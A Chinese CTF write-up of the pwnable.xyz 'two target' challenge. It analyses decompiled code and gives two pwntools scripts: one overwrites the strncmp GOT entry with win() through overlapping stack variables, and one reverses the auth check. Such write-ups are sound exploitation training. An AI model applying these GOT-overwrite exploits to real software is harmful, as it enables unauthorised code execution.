---
title: pwnable-two target
date: 2019-12-08 10:56:56
tags:
- pwn
- pwnable.xyz
---

# pwnable two target

### 分析

老规矩先检查一下可以从哪个地方下手：

![](https://i.loli.net/2019/12/08/sOEtnRylf6ZWNSq.png)

看起来可以用GOT覆写。

然后分析一下`main`函数：

```c
// Address range: 0x400a26 - 0x400b04
int main(int argc, char ** argv) {
    // 0x400b04
    __readfsqword(40);
    setup();
    int64_t v1; // bp-72
    memset(&v1, 0, 56);
    while (true) {
      lab_0x400b36:
        // 0x400b36
        print_menu();
        uint32_t v2 = (int32_t)read_int32(); // 0x400b46
        if (v2 == 2) {
            // 0x400b9b
            printf("nationality: ");
            int64_t v3; // bp-40
            scanf("%24s", &v3);
            // continue -> 0x400b36
            continue;
        }
        if (v2 <= 2) {
            if (v2 == 1) {
                // 0x400b6d
                printf("name: ");
                scanf("%32s", &v1);
                // continue -> 0x400b36
                continue;
            }
          lab_0x400c0c:
            // 0x400c0c
            puts("Invalid");
            // continue -> 0x400b36
            continue;
        }
        switch (v2) {
            case 3: {
                // 0x400bca
                printf("age: ");
                int64_t v4;
                scanf("%d", (int64_t *)v4);
                // continue -> 0x400b36
                continue;
            }
            case 4: {
                // 0x400bf5
                if ((char)auth(&v1) != 0) {	//多了一个auth 函数
                    // 0x400c05
                    win();
                }
                goto lab_0x400b36;
            }
            default: {
                goto lab_0x400c0c;
            }
        }
    }
}
```

`win`函数：

```c
// Address range: 0x40099c - 0x4009af
int64_t win(void) {
    // 0x40099c
    return system("cat flag");
}
```

所以常规方法的话，应该先处理`auth`函数，才能调用`win`函数。（试过`puts`函数的got覆盖，发现不行。🤷‍♂️）

`auth`函数:

```c
// Address range: 0x400a26 - 0x400b04
int64_t auth(int64_t * a1) {
    int64_t v1 = __readfsqword(40); // 0x400a32
    int64_t str = 0; // bp-56
    for (int64_t i = 0; i < 32; i++) {
        char * v2 = (char *)(i + (int64_t)a1); // 0x400a73
        char v3 = *(char *)(i + 0x400b04); // 0x400aa4
        *(char *)(i - 48 + g4) = v3 ^ (16 * *v2 | *v2 / 16);
    }
    int32_t strncmp_rc = strncmp((char *)&str, (char *)&g1, 32); // 0x400ad4
    int64_t result; // 0x400b03
    if (v1 == __readfsqword(40)) {
        // 0x400ac1
        result = strncmp_rc == 0;
    } else {
        // 0x400afd
        __stack_chk_fail();
        result = &g5;
    }
    // 0x400b02
    return result;
}
```

这里其实看到有`strncmp`的got可以利用一下。😁

那就思考一下怎么覆盖掉`strncmp`的got指向的函数地址。

### 思路

在`main`函数里有两个`scanf`尝试去修改`strncmp`的got，

```assembly
#v2 == 2
0x400bac:   48 8d 45 c0                  	lea rax, [rbp - 0x40]
0x400bb0:   48 83 c0 20                  	add rax, 0x20
0x400bb4:   48 89 c6                     	mov rsi, rax
0x400bb7:   48 8d 3d a5 11 00 00         	lea rdi, [rip + 0x11a5]
0x400bbe:   b8 00 00 00 00               	mov eax, 0
0x400bc3:   e8 58 fc ff ff               	call 0x400820 <scanf>

#v2 == 3
0x400bdb:   48 8b 45 f0                  	mov rax, qword ptr [rbp - 0x10]
0x400bdf:   48 89 c6                     	mov rsi, rax
0x400be2:   48 8d 3d 85 11 00 00         	lea rdi, [rip + 0x1185]
0x400be9:   b8 00 00 00 00               	mov eax, 0
0x400bee:   e8 2d fc ff ff               	call 0x400820 <scanf>
```

发现`v3`和`v4`地址只相差`0x10`,并且在`scanf("%24s", &v3);`中我们发现可以在`v3`中输入24个字节，正好可以覆盖掉`v4`中存储的内容，可以考虑覆盖成`strncmp`的got地址，

然后`scanf("%d", (int64_t *)v4);`这里就可以将`strncmp`的got地址指向的内容改成`win`的起始地址。完成覆盖。

所以现在进入`v2 == 4`即可调用`win`。

完成。

### 代码：

```python
from pwn import *

context.log_level = 'DEBUG'
sh = remote('svc.pwnable.xyz', 30031)
elf = ELF('./challenge')
#print elf.got
strcmp_got = elf.got['strncmp']
win_addr = '0x40099c'
payload = 'A' * 16 + p64(strcmp_got)

sh.sendlineafter('> ', '2')
sh.sendafter(': ', payload)
sh.sendlineafter('> ', '3')
sh.sendlineafter(': ', str(int(win_addr, 16)))
sh.sendlineafter('> ', '4')

sh.interactive()
```

### 另解：

其实完全可以模拟出满足`auth`函数的payload输入进去完成调用`win`的操作。

`g1`和`0x400b04`都是固定的。可以找到包括他们在内的32字节数据，根据算法模拟出`a1`。而且`g1`  = `"\x11\xde\xcf\x10\xdf\x75\xbb\xa5\x43\x1e\x9d\xc2\xe3\xbf\xf5\xd6\x96\x7f\xbe\xb0\xbf\xb7\x96\x1d\xa8\xbb\x0a\xd9\xbf\xc9\x0d\xff";`，另外`0x400b04`其实就是main的起始地址。根据算法可以逆向出来求`a1`的算法。

代码：

```python
main = '55 48 89 E5 48 83 EC 50 64 48 8B 04 25 28 00 00 00 48 89 45 F8 31 C0 E8 24 FE FF FF 48 8D 45 C0'.split(' ')
g1   = '11 DE CF 10 DF 75 BB A5 43 1E 9D C2 E3 BF F5 D6 96 7F BE B0 BF B7 96 1D A8 BB 0A D9 BF C9 0D FF'.split(' ')
result = []
for i in range(32):
    result.append( int(main[i],16) ^ int(g1[i],16) )
payload = ''

for i in result:
    up = i >> 4
    down = ((i << 4) & 0xff)
    # print (up | down)
    payload = payload + chr(up | down)

from pwn import *
context.log_level = 'DEBUG'
sh = remote('svc.pwnable.xyz',30031)
sh.sendlineafter('> ','1')
sh.sendlineafter(': ',payload)
sh.sendlineafter('> ','4')
sh.interactive()
```

### 效果：

![](https://i.loli.net/2019/12/08/P7kICS1XJQqr93E.png)

